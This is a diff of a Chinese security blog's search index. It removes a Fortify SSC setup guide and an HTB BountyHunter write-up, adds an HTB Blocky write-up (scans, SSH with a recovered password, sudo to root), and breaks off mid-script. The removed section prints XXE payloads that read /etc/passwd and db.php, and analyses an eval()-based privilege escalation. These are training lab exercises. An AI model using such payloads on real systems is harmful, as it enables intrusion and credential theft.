@@ -1,124 +1,9 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>Fortify SSC 24.X 搭建</title>
-    <url>/DevSecOps/tools/fortifyssc/</url>
-    <content><![CDATA[<blockquote>
-<p>Fortify Software Security Center 是一款基于浏览器的产品，可在整个软件开发生命周期中提供一组功能，以自动检测应用程序中的安全漏洞。它通过提供来自 OpenText™ Fortify Static Code Analyzer、OpenText™ Fortify ScanCentral SAST、OpenText™ Fortify ScanCentral DAST 和 Sonatype 的关联数据，帮助安全和开发团队协同工作，通过其协作在线环境快速准确地解决安全漏洞。</p>
-</blockquote>
-<span id="more"></span>
-
-<img src="/DevSecOps/tools/fortifyssc/DraggedImage.png" class="">
-
-<h3 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h3><ul>
-<li>系统：Windows Server 2022</li>
-<li>软件： Apache Tomcat 9.0.x 、 JDK 17、Fortify Software Security Center 24.2</li>
-<li>数据库： MySQL 8.0.x </li>
-<li>账号： 管理员权限</li>
-</ul>
-<h3 id="安装步骤"><a href="#安装步骤" class="headerlink" title="安装步骤"></a>安装步骤</h3><h4 id="安装并配置JDK环境"><a href="#安装并配置JDK环境" class="headerlink" title="安装并配置JDK环境"></a>安装并配置JDK环境</h4><p>安装JDK17，配置JDK环境变量，打开命令行输入 java、javac、java - version均有相应回显</p>
-<img src="/DevSecOps/tools/fortifyssc/DraggedImage-1.png" class="" title="jdk环境">
-
-<h4 id="安装并配置MySQL"><a href="#安装并配置MySQL" class="headerlink" title="安装并配置MySQL"></a>安装并配置MySQL</h4><p>安装MySQL，选择Custom</p>
-<img src="/DevSecOps/tools/fortifyssc/DraggedImage-2.png" class="" title="安装Mysql">
-
-
-
-<p>安装完成后修改my.ini文件(必需)</p>
-<p>在<code>[mysqld]</code>和<code>[mysqldump]</code>部分中，均设置<code>max\_allowed\_packet</code>为1G,如果没有<code>[mysqldump]</code>,则需要自己创建</p>
-<img src="/DevSecOps/tools/fortifyssc/DraggedImage-3.png" class="" title="my.ini">
-<p>在<code>[mysqld]</code>部分修改</p>
-<table>
-<thead>
-<tr>
-<th>选项</th>
-<th>值</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>default_storage_engine</td>
-<td>INNODB</td>
-</tr>
-<tr>
-<td>innodb_buffer_pool_size</td>
-<td>512M</td>
-</tr>
-<tr>
-<td>innodb_lock_wait_timeout</td>
-<td>300</td>
-</tr>
-<tr>
-<td>innodb_log_file_size</td>
-<td>512M</td>
-</tr>
-<tr>
-<td>max_allowed_packetv</td>
-<td>1G</td>
-</tr>
-<tr>
-<td>sql-mode</td>
-<td>“TRADITIONAL”</td>
-</tr>
-</tbody></table>
-<p>保存配置，命令行重启服务（要管理员权限）</p>
-<img src="/DevSecOps/tools/fortifyssc/DraggedImage-4.png" class="" title="重启mysql服务">
-
-<h4 id="导入官方提供的SQL脚本"><a href="#导入官方提供的SQL脚本" class="headerlink" title="导入官方提供的SQL脚本"></a>导入官方提供的SQL脚本</h4><p>新建数据库并导入SQL脚本：数据库字符集设置为<code>utf8\\uft8\_bin</code></p>
-<img src="/DevSecOps/tools/fortifyssc/DraggedImage-5.png" class="" title="新建数据库">
-
-
-
-<p>禁用安全模式,然后重新连接数据库</p>
-<img src="/DevSecOps/tools/fortifyssc/DraggedImage-6.png" class="" title="禁用安全模式">
-<img src="/DevSecOps/tools/fortifyssc/DraggedImage-7.png" class="" title="导入sql脚本">
-
-<h4 id="安装Tomcat"><a href="#安装Tomcat" class="headerlink" title="安装Tomcat"></a>安装Tomcat</h4><p>使用安装版安装Tomcat，选择full</p>
-<img src="/DevSecOps/tools/fortifyssc/DraggedImage-8.png" class="" title="tomcat">
-<img src="/DevSecOps/tools/fortifyssc/DraggedImage-9.png" class="" title="tomcat">
-
-<h4 id="配置Tomcat"><a href="#配置Tomcat" class="headerlink" title="配置Tomcat"></a>配置Tomcat</h4><p>清空webapps目录，并放入ssc.war</p>
-<img src="/DevSecOps/tools/fortifyssc/DraggedImage-10.png" class="" title="webapps">
-<p>进入<code>Apache Software Foundation\\Tomcat 9.0\\bin</code>, 点开tomcat9w –&gt; Java –&gt; Java options 添加<code>-Dfortify.home=E:\SSC\fortify </code>  –&gt; 修改内存(初始化4G，最大推荐16以上) –&gt; 应用, 然后启动Tomcat</p>
-<img src="/DevSecOps/tools/fortifyssc/DraggedImage-11.png" class="">
-<style>.xawjuznumqpg{zoom:150%;}</style><img src="/DevSecOps/tools/fortifyssc/DraggedImage-12.png" class="xawjuznumqpg" alt="修改配置">
-<style>.xhwubqvniluk{zoom:150%;}</style><img src="/DevSecOps/tools/fortifyssc/DraggedImage-13.png" class="xhwubqvniluk">
-
-<h4 id="安装SSC"><a href="#安装SSC" class="headerlink" title="安装SSC"></a>安装SSC</h4><p> 打开浏览器访问 <a href="http://127.0.0.1:8080/ssc/">http://127.0.0.1:8080/ssc/</a></p>
-<img src="/DevSecOps/tools/fortifyssc/DraggedImage-14.png" class="" title="访问SSC">
-
-<p>打开上面配置的那个fortify home的路径，有个init.token文件，复制内容贴进去</p>
-<img src="/DevSecOps/tools/fortifyssc/DraggedImage-15.png" class="" title="获取token">
-<img src="/DevSecOps/tools/fortifyssc/DraggedImage-16.png" class="" title="登录">
-
-<p>上传License</p>
-<img src="/DevSecOps/tools/fortifyssc/DraggedImage-17.png" class="" title="上传许可证">
-<img src="/DevSecOps/tools/fortifyssc/DraggedImage-18.png" class="" title="默认配置">
-
-
-
-<p>配置数据</p>
-<p><code>jdbc:mysql://ip:3306/sscsessionVariables=collation_connection=utf8_bin&amp;rewriteBatchedStatements=true</code></p>
-<img src="/DevSecOps/tools/fortifyssc/DraggedImage-19.png" class="" title="配置数据库">
-
-<p>上传种子包，需要按顺序上传</p>
-<img src="/DevSecOps/tools/fortifyssc/DraggedImage-20.png" class="" title="upload seed">
-<img src="/DevSecOps/tools/fortifyssc/DraggedImage-21.png" class="" title="上传成功">
-
-<p>重启Tomcat</p>
-<img src="/DevSecOps/tools/fortifyssc/DraggedImage-22.png" class="" title="重启服务">]]></content>
-      <categories>
-        <category>DevSecOps</category>
-      </categories>
-      <tags>
-        <tag>企业安全建设</tag>
-        <tag>DevSecOps</tag>
-        <tag>工具</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>HTB-Arctic</title>
     <url>/Hackthebox/htb/htb-arctic/</url>
-    <content><![CDATA[<style>.pfqsepowxhhf{zoom:50%;}</style><img src="/Hackthebox/htb/htb-arctic/0d6275efbd5e48fcdc96e61b9724ae5e.png" class="pfqsepowxhhf">
+    <content><![CDATA[<style>.qcktivnjsoum{zoom:50%;}</style><img src="/Hackthebox/htb/htb-arctic/0d6275efbd5e48fcdc96e61b9724ae5e.png" class="qcktivnjsoum">
 
 <span id="more"></span>
 
@@ -191,7 +76,7 @@
   <entry>
     <title>HTB-Bastard</title>
     <url>/Hackthebox/htb/htb-bastard/</url>
-    <content><![CDATA[<style>.ztqyjsfrupdn{zoom:50%;}</style><img src="/Hackthebox/htb/htb-bastard/a8d2ae87fbe6d1ccfe93522d74defb3a.png" class="ztqyjsfrupdn">
+    <content><![CDATA[<style>.dpukzqmrolmg{zoom:50%;}</style><img src="/Hackthebox/htb/htb-bastard/a8d2ae87fbe6d1ccfe93522d74defb3a.png" class="dpukzqmrolmg">
 
 <span id="more"></span>
 
@@ -264,9 +149,72 @@
       </tags>
   </entry>
   <entry>
+    <title>HTB-Blocky</title>
+    <url>/Hackthebox/htb/htb-blocky/</url>
+    <content><![CDATA[<style>.uebkoljvovmk{zoom:50%;}</style><img src="/Hackthebox/htb/htb-blocky/f412784c311bdf52c3655381d2c9cd21.png" class="uebkoljvovmk">
+
+<span id="more"></span>
+
+<table>
+<thead>
+<tr>
+<th align="left">OS</th>
+<th align="left">Difficulty</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">Linux</td>
+<td align="left">Easy</td>
+</tr>
+</tbody></table>
+<h3 id="Nmap-Scan"><a href="#Nmap-Scan" class="headerlink" title="Nmap Scan"></a>Nmap Scan</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ nmap 10.10.10.37 -sV  -sC -p- -T4  -e tun0  </span><br><span class="line">Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-02 10:43 CST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.10.10.37</span><br><span class="line">Host is up (0.13s latency).</span><br><span class="line">Not shown: 65530 filtered tcp ports (no-response)</span><br><span class="line">PORT      STATE  SERVICE   VERSION</span><br><span class="line">21/tcp    open   ftp       ProFTPD 1.3.5a</span><br><span class="line">22/tcp    open   ssh       OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 d6:2b:99:b4:d5:e7:53:ce:2b:<span class="built_in">fc</span>:b5:d7:9d:79:fb:a2 (RSA)</span><br><span class="line">|   256 5d:7f:38:95:70:c9:be:ac:67:a0:1e:86:e7:97:84:03 (ECDSA)</span><br><span class="line">|_  256 09:d5:c2:04:95:1a:90:ef:87:56:25:97:<span class="built_in">df</span>:83:70:67 (ED25519)</span><br><span class="line">80/tcp    open   http      Apache httpd 2.4.18</span><br><span class="line">|_http-server-header: Apache/2.4.18 (Ubuntu)</span><br><span class="line">|_http-title: Did not follow redirect to http://blocky.htb</span><br><span class="line">8192/tcp  closed sophos</span><br><span class="line">25565/tcp open   minecraft Minecraft 1.11.2 (Protocol: 127, Message: A Minecraft Server, Users: 0/20)</span><br><span class="line">Service Info: Host: 127.0.1.1; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 252.53 seconds</span><br></pre></td></tr></table></figure>
+
+<p>添加本地域名解析到hosts文件</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">echo</span> <span class="string">&#x27;10.10.10.37 blocky.htb&#x27;</span> | <span class="built_in">sudo</span> <span class="built_in">tee</span> -a /etc/hosts</span><br></pre></td></tr></table></figure>
+
+<h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p>访问网站可以看到cms为WordPress，可以在文章中找到一个用户名(notch)</p>
+<img src="/Hackthebox/htb/htb-blocky/image-20250302111220868.png" class="" title="目标">
+
+<p>使用ffuf 对目录进行扫描，访问 <a href="http://blocky.htb/plugins">http://blocky.htb/plugins</a> 发现两个jar包：griefprevention-1.11.2-3.1.1.298.jar 和 BlockyCore.jar</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt:FUZZ -u http://blocky.htb/FUZZ  -t 100 -ic  </span><br><span class="line"></span><br><span class="line">        /<span class="string">&#x27;___\  /&#x27;</span>___\           /<span class="string">&#x27;___\       </span></span><br><span class="line"><span class="string">       /\ \__/ /\ \__/  __  __  /\ \__/       </span></span><br><span class="line"><span class="string">       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      </span></span><br><span class="line"><span class="string">        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      </span></span><br><span class="line"><span class="string">         \ \_\   \ \_\  \ \____/  \ \_\       </span></span><br><span class="line"><span class="string">          \/_/    \/_/   \/___/    \/_/       </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">       v2.1.0-dev</span></span><br><span class="line"><span class="string">________________________________________________</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> :: Method           : GET</span></span><br><span class="line"><span class="string"> :: URL              : http://blocky.htb/FUZZ</span></span><br><span class="line"><span class="string"> :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt</span></span><br><span class="line"><span class="string"> :: Follow redirects : false</span></span><br><span class="line"><span class="string"> :: Calibration      : false</span></span><br><span class="line"><span class="string"> :: Timeout          : 10</span></span><br><span class="line"><span class="string"> :: Threads          : 100</span></span><br><span class="line"><span class="string"> :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500</span></span><br><span class="line"><span class="string">________________________________________________</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">wiki                    [Status: 301, Size: 307, Words: 20, Lines: 10, Duration: 113ms]</span></span><br><span class="line"><span class="string">wp-content              [Status: 301, Size: 313, Words: 20, Lines: 10, Duration: 130ms]</span></span><br><span class="line"><span class="string">plugins                 [Status: 301, Size: 310, Words: 20, Lines: 10, Duration: 125ms]</span></span><br><span class="line"><span class="string">wp-includes             [Status: 301, Size: 314, Words: 20, Lines: 10, Duration: 121ms]</span></span><br><span class="line"><span class="string">javascript              [Status: 301, Size: 313, Words: 20, Lines: 10, Duration: 197ms]</span></span><br><span class="line"><span class="string">wp-admin                [Status: 301, Size: 311, Words: 20, Lines: 10, Duration: 118ms]</span></span><br><span class="line"><span class="string">phpmyadmin              [Status: 301, Size: 313, Words: 20, Lines: 10, Duration: 109ms]</span></span><br><span class="line"><span class="string">server-status           [Status: 403, Size: 298, Words: 22, Lines: 12, Duration: 152ms]</span></span><br><span class="line"><span class="string">:: Progress: [220546/220546] :: Job [1/1] :: 897 req/sec :: Duration: [0:04:56] :: Errors: 0 ::</span></span><br></pre></td></tr></table></figure>
+
+<img src="/Hackthebox/htb/htb-blocky/image-20250302110356493.png" class="" title="jar">
+
+<p>反编译jar包发现密码<img src="/Hackthebox/htb/htb-blocky/image-20250302110940408.png" class="" title="反编译"></p>
+<h3 id="SSH登录"><a href="#SSH登录" class="headerlink" title="SSH登录"></a>SSH登录</h3><p>使用获取到的用户名(notch)和密码成功登录SSH</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ ssh notch@blocky.htb </span><br><span class="line">The authenticity of host <span class="string">&#x27;blocky.htb (10.10.10.37)&#x27;</span> can<span class="string">&#x27;t be established.</span></span><br><span class="line"><span class="string">ED25519 key fingerprint is SHA256:ZspC3hwRDEmd09Mn/ZlgKwCv8I8KDhl9Rt2Us0fZ0/8.</span></span><br><span class="line"><span class="string">This key is not known by any other names.</span></span><br><span class="line"><span class="string">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes</span></span><br><span class="line"><span class="string">Warning: Permanently added &#x27;</span>blocky.htb<span class="string">&#x27; (ED25519) to the list of known hosts.</span></span><br><span class="line"><span class="string">notch@blocky.htb&#x27;</span>s password: </span><br><span class="line">Welcome to Ubuntu 16.04.2 LTS (GNU/Linux 4.4.0-62-generic x86_64)</span><br><span class="line"></span><br><span class="line"> * Documentation:  https://help.ubuntu.com</span><br><span class="line"> * Management:     https://landscape.canonical.com</span><br><span class="line"> * Support:        https://ubuntu.com/advantage</span><br><span class="line"></span><br><span class="line">7 packages can be updated.</span><br><span class="line">7 updates are security updates.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Last login: Fri Jul  8 07:16:08 2022 from 10.10.14.29</span><br><span class="line">To run a <span class="built_in">command</span> as administrator (user <span class="string">&quot;root&quot;</span>), use <span class="string">&quot;sudo &lt;command&gt;&quot;</span>.</span><br><span class="line">See <span class="string">&quot;man sudo_root&quot;</span> <span class="keyword">for</span> details.</span><br><span class="line"></span><br><span class="line">notch@Blocky:~$ <span class="built_in">id</span></span><br><span class="line">uid=1000(notch) gid=1000(notch) <span class="built_in">groups</span>=1000(notch),4(adm),24(cdrom),27(<span class="built_in">sudo</span>),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare)</span><br><span class="line">notch@Blocky:~$ </span><br></pre></td></tr></table></figure>
+
+<h3 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h3><p>运行sudo  -i 可以直接切换到root帐号</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">notch@Blocky:~$ <span class="built_in">sudo</span> -l</span><br><span class="line">[<span class="built_in">sudo</span>] password <span class="keyword">for</span> notch: </span><br><span class="line">Matching Defaults entries <span class="keyword">for</span> notch on Blocky:</span><br><span class="line">    env_reset, mail_badpass,</span><br><span class="line">    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin</span><br><span class="line"></span><br><span class="line">User notch may run the following commands on Blocky:</span><br><span class="line">    (ALL : ALL) ALL</span><br><span class="line">notch@Blocky:~$ <span class="built_in">sudo</span> -i </span><br><span class="line">root@Blocky:~# <span class="built_in">id</span></span><br><span class="line">uid=0(root) gid=0(root) <span class="built_in">groups</span>=0(root)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<table>
+<thead>
+<tr>
+<th align="left">Flag</th>
+<th align="left">Path</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">Flag1</td>
+<td align="left">&#x2F;home&#x2F;notch&#x2F;user.txt</td>
+</tr>
+<tr>
+<td align="left">Flag2</td>
+<td align="left">&#x2F;root&#x2F;root.txt</td>
+</tr>
+</tbody></table>
+]]></content>
+      <categories>
+        <category>Hackthebox</category>
+      </categories>
+      <tags>
+        <tag>密码重用</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>HTB-Beep</title>
     <url>/Hackthebox/htb/htb-beep/</url>
-    <content><![CDATA[<style>.kuitsxltqpnx{zoom:50%;}</style><img src="/Hackthebox/htb/htb-beep/995f465295b99869fce21ecadea4604c.png" class="kuitsxltqpnx">
+    <content><![CDATA[<style>.pfrznsdkbjgb{zoom:50%;}</style><img src="/Hackthebox/htb/htb-beep/995f465295b99869fce21ecadea4604c.png" class="pfrznsdkbjgb">
 
 <span id="more"></span>
 
@@ -333,7 +281,7 @@
   <entry>
     <title>HTB-Blue</title>
     <url>/Hackthebox/htb/htb-blue/</url>
-    <content><![CDATA[<style>.vnndrkqdsynj{zoom:50%;}</style><img src="/Hackthebox/htb/htb-blue/52e077ae40899ab8b024afd51cb29b1c.png" class="vnndrkqdsynj">
+    <content><![CDATA[<style>.wfotvpxgptlz{zoom:50%;}</style><img src="/Hackthebox/htb/htb-blue/52e077ae40899ab8b024afd51cb29b1c.png" class="wfotvpxgptlz">
 
 <span id="more"></span>
 
@@ -381,88 +329,9 @@
       </tags>
   </entry>
   <entry>
-    <title>HTB-BountyHunter</title>
-    <url>/Hackthebox/htb/htb-bountyhunter/</url>
-    <content><![CDATA[<style>.rwvovioxzbli{zoom:50%;}</style><img src="/Hackthebox/htb/htb-bountyhunter/a24c032885e56a17a6c74cc58b63e8f4.png" class="rwvovioxzbli">
-
-<span id="more"></span>
-
-<table>
-<thead>
-<tr>
-<th align="left">OS</th>
-<th align="left">Difficulty</th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="left">Linux</td>
-<td align="left">Easy</td>
-</tr>
-</tbody></table>
-<h3 id="Nmap-Scan"><a href="#Nmap-Scan" class="headerlink" title="Nmap Scan"></a>Nmap Scan</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ nmap 10.10.11.100 -sV -sC  -p- -T4 --min-rate 1000 -e tun0 </span><br><span class="line">Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-22 09:08 CST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.10.11.100</span><br><span class="line">Host is up (0.12s latency).</span><br><span class="line">Not shown: 65533 closed tcp ports (reset)</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   3072 d4:4c:f5:79:9a:79:a3:b0:f1:66:25:52:c9:53:1f:e1 (RSA)</span><br><span class="line">|   256 a2:1e:67:61:8d:2f:7a:37:a7:ba:3b:51:08:e8:89:a6 (ECDSA)</span><br><span class="line">|_  256 a5:75:16:d9:69:58:50:4a:14:11:7a:42:c1:b6:23:44 (ED25519)</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))</span><br><span class="line">|_http-title: Bounty Hunters</span><br><span class="line">|_http-server-header: Apache/2.4.41 (Ubuntu)</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 99.59 seconds</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>开放了2个端口22(SSH)和80(HTTP)，对80进行Fuzz</p>
-<h3 id="Fuzzing"><a href="#Fuzzing" class="headerlink" title="Fuzzing"></a>Fuzzing</h3><p>找到&#x2F;index.php、 &#x2F;portal.php、 &#x2F;db.php</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt:FUZZ -u http://10.10.11.100/FUZZ.php  -t 100 -ic</span><br><span class="line"></span><br><span class="line">        /<span class="string">&#x27;___\  /&#x27;</span>___\           /<span class="string">&#x27;___\       </span></span><br><span class="line"><span class="string">       /\ \__/ /\ \__/  __  __  /\ \__/       </span></span><br><span class="line"><span class="string">       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      </span></span><br><span class="line"><span class="string">        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      </span></span><br><span class="line"><span class="string">         \ \_\   \ \_\  \ \____/  \ \_\       </span></span><br><span class="line"><span class="string">          \/_/    \/_/   \/___/    \/_/       </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">       v2.1.0-dev</span></span><br><span class="line"><span class="string">________________________________________________</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> :: Method           : GET</span></span><br><span class="line"><span class="string"> :: URL              : http://10.10.11.100/FUZZ.php</span></span><br><span class="line"><span class="string"> :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt</span></span><br><span class="line"><span class="string"> :: Follow redirects : false</span></span><br><span class="line"><span class="string"> :: Calibration      : false</span></span><br><span class="line"><span class="string"> :: Timeout          : 10</span></span><br><span class="line"><span class="string"> :: Threads          : 100</span></span><br><span class="line"><span class="string"> :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500</span></span><br><span class="line"><span class="string">________________________________________________</span></span><br><span class="line"><span class="string">index                   [Status: 200, Size: 25169, Words: 10028, Lines: 389, Duration: 3174ms]</span></span><br><span class="line"><span class="string">portal                  [Status: 200, Size: 125, Words: 11, Lines: 6, Duration: 204ms]</span></span><br><span class="line"><span class="string">db                      [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 105ms]</span></span><br></pre></td></tr></table></figure>
-
-<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>访问&#x2F;portal.php 跳转到表单页面</p>
-<img src="/Hackthebox/htb/htb-bountyhunter/image-20250222104837169.png" class="" title="跳转">
-
-<p>使用burp进行抓包，对数据包进行base64解码，发现是XML</p>
-<img src="/Hackthebox/htb/htb-bountyhunter/image-20250222104858450.png" class="" title="表单">
-
-<p>尝试进行XXE攻击，找到两个帐号：development和root</p>
-<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml  version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;ISO-8859-1&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">replace</span> [<span class="meta">&lt;!ENTITY <span class="keyword">example</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///etc/passwd&quot;</span>&gt;</span> ]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">bugreport</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">title</span>&gt;</span><span class="symbol">&amp;example;</span><span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">cwe</span>&gt;</span>111<span class="tag">&lt;/<span class="name">cwe</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">cvss</span>&gt;</span>3.0<span class="tag">&lt;/<span class="name">cvss</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">reward</span>&gt;</span>20<span class="tag">&lt;/<span class="name">reward</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bugreport</span>&gt;</span></span><br></pre></td></tr></table></figure>
-
-<img src="/Hackthebox/htb/htb-bountyhunter/image-20250222092505979.png" class="" title="XXE">
-
-<p>使用PHP Wrapper 读取db.php文件</p>
-<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml  version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;ISO-8859-1&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">replace</span> [<span class="meta">&lt;!ENTITY <span class="keyword">example</span> <span class="keyword">SYSTEM</span> <span class="keyword">php</span>://filter/convert.base64-encode/resource=db.php<span class="string">&quot;&gt; ]&gt;</span></span></span></span><br><span class="line"><span class="string"><span class="meta"><span class="meta">&lt;bugreport&gt;</span></span></span></span><br><span class="line"><span class="string"><span class="meta"><span class="meta">		&lt;title&gt;&amp;example;&lt;/title&gt;</span></span></span></span><br><span class="line"><span class="string"><span class="meta"><span class="meta">		&lt;cwe&gt;111&lt;/cwe&gt;</span></span></span></span><br><span class="line"><span class="string"><span class="meta"><span class="meta">		&lt;cvss&gt;3.0&lt;/cvss&gt;</span></span></span></span><br><span class="line"><span class="string"><span class="meta"><span class="meta">		&lt;reward&gt;20&lt;/reward&gt;</span></span></span></span><br><span class="line"><span class="string"><span class="meta"><span class="meta">&lt;/bugreport&gt;</span></span></span></span><br></pre></td></tr></table></figure>
-
-<img src="/Hackthebox/htb/htb-bountyhunter/image-20250222094939072.png" class="" title="XXE">
-
-<p>解码base64,找到数据库密码，使用development登录SSH</p>
-<img src="/Hackthebox/htb/htb-bountyhunter/image-20250222095232981.png" class="" title="解码">
-
-<h3 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h3><p>使用<code>sudo -l</code>找个一个可利用的Python文件</p>
-<img src="/Hackthebox/htb/htb-bountyhunter/image-20250222101020734.png" class="" title="提权">
-
-<p>分析Python脚本</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#Skytrain Inc Ticket Validation System 0.1</span></span><br><span class="line"><span class="comment">#Do not distribute this file.</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">load_file</span>(<span class="params">loc</span>):</span><br><span class="line">    <span class="keyword">if</span> loc.endswith(<span class="string">&quot;.md&quot;</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">open</span>(loc, <span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Wrong file type.&quot;</span>)</span><br><span class="line">        exit()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">evaluate</span>(<span class="params">ticketFile</span>):</span><br><span class="line">    <span class="comment">#Evaluates a ticket to check for ireggularities.</span></span><br><span class="line">    code_line = <span class="literal">None</span></span><br><span class="line">    <span class="keyword">for</span> i,x <span class="keyword">in</span> <span class="built_in">enumerate</span>(ticketFile.readlines()):</span><br><span class="line">        <span class="keyword">if</span> i == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> x.startswith(<span class="string">&quot;# Skytrain Inc&quot;</span>):   // md 文档第<span class="number">1</span>行需要包含</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">if</span> i == <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> x.startswith(<span class="string">&quot;## Ticket to &quot;</span>):  //md 文档第<span class="number">2</span>行需要包含，注意有个空格</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;Destination: <span class="subst">&#123;<span class="string">&#x27; &#x27;</span>.join(x.strip().split(<span class="string">&#x27; &#x27;</span>)[<span class="number">3</span>:])&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> x.startswith(<span class="string">&quot;__Ticket Code:__&quot;</span>): //md 文档第<span class="number">3</span>行需要包含</span><br><span class="line">            code_line = i+<span class="number">1</span></span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> code_line <span class="keyword">and</span> i == code_line:  //md 文档第<span class="number">4</span>行需要包含</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> x.startswith(<span class="string">&quot;**&quot;</span>):</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">            ticketCode = x.replace(<span class="string">&quot;**&quot;</span>, <span class="string">&quot;&quot;</span>).split(<span class="string">&quot;+&quot;</span>)[<span class="number">0</span>]  //匹配**开头，并且根据+分割，取第一项</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">int</span>(ticketCode) % <span class="number">7</span> == <span class="number">4</span>:  //取出的值模<span class="number">7</span> 等于<span class="number">4</span> 如<span class="number">4</span>,<span class="number">11</span>，<span class="number">18</span></span><br><span class="line">                validationNumber = <span class="built_in">eval</span>(x.replace(<span class="string">&quot;**&quot;</span>, <span 